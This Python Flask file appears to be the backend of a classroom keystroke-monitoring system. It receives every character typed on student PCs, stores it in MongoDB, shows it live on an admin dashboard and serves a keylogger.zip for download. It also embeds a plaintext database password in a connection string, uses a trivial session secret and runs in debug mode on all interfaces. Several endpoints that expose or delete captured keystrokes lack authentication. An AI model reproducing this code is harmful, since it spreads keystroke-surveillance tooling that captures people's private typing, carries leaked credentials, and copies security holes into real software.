from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory, jsonify,make_response
from pymongo import MongoClient
import bcrypt
from datetime import datetime, timedelta
from bson import ObjectId


app = Flask(__name__)
app.secret_key = "testing"
notifications = []

def MongoDB():
    client = MongoClient("mongodb+srv://admin:Vijeth1234@cluster0.hso09.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
    db = client.get_database('total_records')
    records = db.register
    keystrokes = db.keystrokes
    notifications = db.notifications
    return records, keystrokes, notifications

records, keystrokes ,notifications= MongoDB()

def login_required(func):
    def wrapper(*args, **kwargs):
        if "email" not in session:
            return redirect(url_for("login"))
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

@app.route("/")
def home():
    return render_template("FirstIndex.html")

@app.route("/admin/register", methods=['GET', 'POST'])
def index():
    message = ''
    if "email" in session:
        return redirect(url_for("logged_in"))

    if request.method == "POST":
        user = request.form.get("fullname")
        email = request.form.get("email")
        password1 = request.form.get("password1")
        password2 = request.form.get("password2")
        admin_id = request.form.get("admin_id")

        user_found = records.find_one({"name": user})
        email_found = records.find_one({"email": email})

        if user_found:
            message = 'User with this name already exists.'
            return render_template('index.html', message=message)
        if email_found:
            message = 'This email already exists in the database.'
            return render_template('index.html', message=message)
        if password1 != password2:
            message = 'Passwords should match!'
            return render_template('index.html', message=message)
        else:
            hashed = bcrypt.hashpw(password2.encode('utf-8'), bcrypt.gensalt())
            user_input = {'name': user, 'email': email, 'password': hashed, 'admin_id': admin_id}
            records.insert_one(user_input)
            return redirect(url_for('login'))


@app.route("/login", methods=["POST", "GET"])
def login():
    message = 'Please login to your account'
    if "email" in session:
        return redirect(url_for("logged_in"))

    if request.method == "POST": 
        email = request.form.get("email")
        password = request.form.get("password")
        admin_id = request.form.get("admin_id")
        email_found = records.find_one({"email": email})

        if email_found:
            passwordcheck = email_found['password']
            if bcrypt.checkpw(password.encode('utf-8'), passwordcheck) and email_found['admin_id'] == admin_id:
                session["email"] = email
                records.update_one({"email": email}, {"$set": {"last_login_time": datetime.utcnow()}})
                return redirect(url_for("logged_in"))
            else:
                message = 'Wrong password or admin ID'
        else:
            message = 'Email not found'

    return render_template('login.html', message=message)

@app.route('/logged_in')
def logged_in():
    if "email" in session:
        email = session["email"]
        return render_template('logged_in.html', email=email)
    return redirect(url_for("login"))



@app.route('/dashboard')
def dashboard():
    if "email" in session:
        admin_email = session["email"]
        admin_data = records.find_one({"email": admin_email})
        if not admin_data:
            return redirect(url_for("login"))

        admin_id = admin_data["admin_id"]
        admin_name = admin_data["name"]

        logs = keystrokes.find({"admin_id": admin_id})
        current_time = datetime.utcnow()
        pc_data = []

        for log in logs:
            last_activity = log.get("last_activity")
            session_id = log.get("session_id", "Unknown Session")
            pc_number = log.get("pc_number", "Unknown PC")
            student_name = log.get("student_name", "Unknown Student")

            keystrokes_data = ''.join(log.get("keystrokes", [])) if log.get("keystrokes") else ""
            is_active = last_activity and current_time - last_activity < timedelta(minutes=5)

            pc_data.append({
                "pc_number": pc_number,
                "session_id": session_id,
                "student_name": student_name,
                "keystrokes": keystrokes_data,
                "active": is_active
            })

        return render_template('dashboard.html', pc_data=pc_data,admin_id=admin_id,admin_email=admin_email,admin_name=admin_name)

    return redirect(url_for("login"))

def get_pc_data(admin_id):
    current_time = datetime.utcnow()
    pc_data = []

    logs = keystrokes.find({"admin_id": admin_id})

    for log in logs:
        last_activity = log.get("last_activity")
        if last_activity:
            if current_time - last_activity < timedelta(minutes=5):
                pc_number = log.get("pc_number", "Unknown PC")
                student_name = log.get("student_name", "Unknown Student")
                keystrokes_data = ''.join(log.get("keystrokes", []))

                pc_data.append({
                    "pc_number": pc_number,
                    "student_name": student_name,
                    "keystrokes": keystrokes_data,
                    "active": True  
                })
            else:
                pc_number = log.get("pc_number", "Unknown PC")
                student_name = log.get("student_name", "Unknown Student")
                pc_data.append({
                    "pc_number": pc_number,
                    "student_name": student_name,
                    "keystrokes": "",
                    "active": False  
                })

    return pc_data




@app.route('/student')
def student():
    return render_template('student.html')

@app.route('/logout', methods=["POST", "GET"])
def logout():
    session.clear()
    response = make_response(render_template("signout.html"))
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

@app.route('/log', methods=['POST'])
def log_keypress():
    data = request.json
    key = data.get('typed_text')
    action = data.get('action', None)  

    student_name = data.get('name', 'Unknown Student')
    admin_id = data.get('admin_id', '')
    pc_number = data.get('pc_number', 'Unknown PC')
    session_id = data.get('session_id', '')

    if not session_id:
        return {'error': 'Missing session_id'}, 400

   
    admin_found = records.find_one({"admin_id": admin_id})
    if not admin_found:
        return {'error': 'Invalid admin ID'}, 404

    try:
      
        filter_criteria = {
            'admin_id': admin_id,
            'student_name': student_name,
            'pc_number': pc_number,
            'session_id': session_id, 
        }

    
        if action == 'backspace':
          
            keystrokes.update_one(
                filter_criteria,
                {
                    '$pop': {'keystrokes': 1}, 
                    '$set': {'last_activity': datetime.utcnow()}
                },
                upsert=True
            )
        elif key:  
            keystrokes.update_one(
                filter_criteria,
                {
                    '$push': {'keystrokes': key},
                    '$set': {'last_activity': datetime.utcnow()}
                },
                upsert=True
            )

        keystrokes.update_one(
            filter_criteria,
            {'$set': {'active': True}},
            upsert=True
        )

        return '', 200
    except Exception as e:
        print(f"Error logging keypress: {e}")
        return {'error': 'Internal server error'}, 500

@app.route('/display', methods=['GET'])
def display_keystrokes():
    session_id = request.args.get('session_id')
    if not session_id:
        return {'error': 'Missing session_id'}, 400

    try:
        keystrokes_data = keystrokes.find_one({'session_id': session_id})

        if keystrokes_data:
            keystrokes_list = keystrokes_data.get('keystrokes', [])
            keystrokes_text = ''.join(keystrokes_list)

            keystrokes_html = keystrokes_text.replace('\n', '<br>')
            keystrokes_html = keystrokes_html.replace(' ', '&nbsp;')
            return keystrokes_html, 200
        else:
            return {'error': 'No keystrokes found for this session'}, 404
    except Exception as e:
        print(f"Error displaying keystrokes: {e}")
        return {'error': 'Internal server error'}, 500





@app.route('/download_keylogger', methods=['GET'])
def download_keylogger():
    return send_from_directory(directory='static', path='keylogger.zip', as_attachment=True)

@app.route('/validate_admin', methods=['POST'])
def validate_admin():
    admin_id = request.json.get('admin_id')
    admin_found = records.find_one({"admin_id": admin_id})

    if admin_found:
        return {'status': 'valid'}
    else:
        return {'status': 'invalid'}, 404
    
@app.route('/get_keystrokes', methods=['GET'])
def get_keystrokes():
    if "email" in session:
        admin_email = session["email"]
        admin_data = records.find_one({"email": admin_email})
        admin_id = admin_data["admin_id"]

        current_time = datetime.utcnow()
        active_keystrokes = keystrokes.find({"admin_id": admin_id})
        keystrokes_list = []

        for data in active_keystrokes:
            last_activity = data.get('last_activity')
            if last_activity and current_time - last_activity < timedelta(minutes=5):  
                keystrokes_list.append({
                    "pc_number": data.get("pc_number"),
                    "student_name": data.get("student_name", "Unknown"),
                    "keystrokes": ''.join(data.get("keystrokes", []))
                })

        return jsonify(keystrokes_list)

    return jsonify({"error": "Not logged in"}), 401

@app.route('/get_keystrokes/<pc_number>', methods=['GET'])
def get_keystrokes_for_pc(pc_number):
    if "email" in session:
        admin_email = session["email"]
        admin_data = records.find_one({"email": admin_email})
        admin_id = admin_data["admin_id"]

        keystroke_data = keystrokes.find_one({"admin_id": admin_id, "pc_number": pc_number})
        

        if keystroke_data:
            return jsonify({
                "keystrokes": ''.join(keystroke_data.get("keystrokes", []))  
            })

        return jsonify({"keystrokes": "No keystrokes yet"}), 200

    return jsonify({"error": "Not logged in"}), 401


@app.route('/remove_pc', methods=['POST'])
def remove_pc():
    data = request.json
    admin_id = data.get('admin_id')
    pc_number = data.get('pc_number')

    if not admin_id or not pc_number:
        return {'error': 'Missing admin_id or pc_number'}, 400

    result = keystrokes.delete_one({'admin_id': admin_id, 'pc_number': pc_number})

    if result.deleted_count > 0:
        return {'status': 'success'}
    else:
        return {'error': 'PC not found'}, 404

@app.route('/last_login_time', methods=['GET'])
def last_login_time():
    if "email" in session:
        email = session["email"]
        admin_data = records.find_one({"email": email})
        admin_id = admin_data["admin_id"]

        last_login_data = records.find_one({"admin_id": admin_id}, {"last_login_time": 1})

        if last_login_data:
            return jsonify({"last_login_time": last_login_data["last_login_time"]})
        else:
            return jsonify({"error": "Last login time not found"}), 404
    else:
        return jsonify({"error": "Not logged in"}), 401


@app.route('/notify', methods=['POST'])
def notify():
    data = request.json
    notification = data.get('notification')
    pc_number = data.get('pc_number')  # Get the PC number from the request

    if notification and pc_number:  # Check if both notification and pc_number are provided
        print(f"Notification received: {data}")

        notification_data = {
            'message': notification,
            'pc_number': pc_number,  # Include the PC number in the notification data
            'timestamp': datetime.utcnow().isoformat()
        }
        notifications.insert_one(notification_data) 
        print(f"Notification added to database: {notification_data}")  
        return '', 200

    print("Error: Missing notification message or PC number in the request body.")
    return {'error': 'Missing notification message or PC number'}, 400



@app.route('/get_notifications', methods=['GET'])
def get_notifications():
    notifications_list = list(notifications.find()) 

    for notification in notifications_list:
        notification['_id'] = str(notification['_id']) 

    print(f"Returning notifications: {notifications_list}")  

    return jsonify(notifications_list), 200  


@app.route('/delete_notification/<notification_id>', methods=['DELETE'])
def delete_notification(notification_id):
    try:
        if len(notification_id) != 24 or not all(c in '0123456789abcdef' for c in notification_id.lower()):
            return jsonify({'error': 'Invalid ObjectId format'}), 400

        object_id = ObjectId(notification_id)
        
        result = notifications.delete_one({'_id': object_id})

        if result.deleted_count > 0:
            return '', 200  
        else:
            return jsonify({'error': 'Notification not found'}), 404  

    except Exception as e:
        print(f"Error deleting notification: {e}")
        return jsonify({'error': 'An error occurred while deleting the notification'}), 500

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
